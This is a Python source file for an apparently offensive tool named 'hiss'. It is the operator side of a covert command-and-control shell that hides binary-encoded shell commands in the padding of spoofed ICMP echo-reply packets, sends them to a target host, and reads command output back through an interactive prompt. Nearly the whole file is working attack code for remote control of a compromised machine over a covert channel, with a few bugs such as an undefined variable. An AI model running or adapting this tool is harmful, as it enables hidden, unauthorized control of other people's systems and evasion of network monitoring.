# Copyright 2023 2xdropout

import base64, binascii, SNEKactions
from scapy.all import *
from os import system
from termcolor import colored

global msgCnt


def tx(command,length):
    target = IP(dst=SNEKactions.get_var('target'), src=SNEKactions.get_var('hissSpoofIP'))/ICMP(type=0, code=7, id=1)/Padding(command)
    send(target)


def rx(action):
    
    
    def strip_packet(packet):
        id = packet[ICMP].id
        messageByteLike = packet[Padding].load
        message = messageByteLike.decode()
        code = packet[ICMP].code
        recv = SNEKactions.get_var('hissRecvIP')

        if packet[IP].src != recv:
            errorMessage = 'ERROR! No Packet Recieved from src (' + src + ') destination! Listening again!'
            print(colored(errorMessage, 'red'))
            rx()
        elif code == 6:
            print("code 6!")
            msgCnt = id
        elif packet[ICMP].type in [0, 'echo-reply']:
            if code == 7:
                strippedMessage = message.rstrip("\x00")
                length = len(strippedMessage)
                while length % 8 != 0:
                    strippedMessage = "0"+str(strippedMessage)
                    length = len(str(strippedMessage))
                if action == 'print':
                    print('\n')
                    print(bin_decode(strippedMessage))
                elif action == 'PWD':
                    getValue = str(bin_decode(strippedMessage))
                    SNEKactions.write_vars('hissPWD',getValue)
                elif action == 'whoami':
                    getValue = str(bin_decode(strippedMessage))
                    SNEKactions.write_vars('hissUser', getValue)
                
                
    msgCnt = 0
    sniff(filter = 'icmp', prn=strip_packet,count=1)


def bin_encode(command):
    values = []
    binary = []
    for char in command:
        values.append(ord(char))
    for value in values:
        bits = str(bin(value)[2:])
        length = len(bits)
        while length < 8:
            bits = "0"+bits
            length = len(bits)
        binary.append(bits)
    value = join_bin(binary)
    return str(value)


def bin_decode(output):
    length = len(output)
    numBytes = length/8
    counter = 0
    byteList = []
    charList = []
    start = 0
    end = 8

    while counter < length:
        byteSection = output[start:end]
        byteList.append(byteSection)
        start = start + 8
        end = end + 8
        counter += 1
    
    
    for value in byteList:
        if value != '':
            baseTwoVal = int(value, 2)
            char = chr(baseTwoVal)
            charList.append(char)
    
    message = "".join(charList)
    return message


def join_bin(list):
    string = [str(i) for i in list]
    returnVal = int("".join(string))
     
    return(returnVal)


def main():
    # Setup
    SNEKactions.write_vars('hissSpoofIP',input('Enter the IP address to be spoofed in the ICMP packets:\n'))
    SNEKactions.write_vars('hissRecvIP',input('Enter the IP address to recieve ICMP packets from:\n'))
    tx(bin_encode('pwd'), 1)
    rx('PWD')
    tx(bin_encode('whoami'), 1)
    rx('whoami')
        
    while True:
        prompt = '<<hiss>><' + SNEKactions.get_var('hissUser') + '@' + SNEKactions.get_var('target') + '><' + SNEKactions.get_var('hissPWD') + '>'
        command = input(colored(prompt,'blue'))

        if command[:2] == 'cd':
            getNewPath = 'realpath ' + command[2:]
            tx(bin_encode(getNewPath), 1)
            rx('PWD')
        elif ' ' not in command:
            command = command + ' ' + SNEKactions.get_var('hissPWD')

        tx(bin_encode(command),1)
        rx('print')

                